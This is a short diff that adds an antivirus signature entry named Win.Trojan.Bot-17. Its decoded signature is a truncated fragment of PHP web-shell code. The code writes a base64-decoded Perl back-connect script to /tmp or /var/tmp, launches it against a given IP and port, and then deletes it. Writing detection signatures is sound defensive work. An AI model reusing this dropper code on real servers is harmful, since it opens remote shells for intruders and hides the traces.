@@ -1,0 +1,5 @@
+VIRUS NAME: Win.Trojan.Bot-17
+TARGET TYPE: HTML
+OFFSET: *
+DECODED SIGNATURE:
+if (is_writable("/tmp")){if (file_exists("/tmp/dc.pl")) { unlink("/tmp/dc.pl"); }$fp=fopen("/tmp/dc.pl","w");fwrite($fp,base64_decode($dc_source));passthru("perl /tmp/dc.pl $ip $port &");unlink("/tmp/dc.pl");}else{if (is_writable("/var/tmp")){if (file_exists("/var/tmp/dc.pl")) { unlink("/var/tmp/dc.pl"); }$fp=fopen("/var/tmp/dc.pl","w");fwrite($fp,base64_decode($dc_source));passthru("perl /var/tmp/dc.pl $ip $port &");unlink("/var/tmp/dc.pl");}if (is_writable
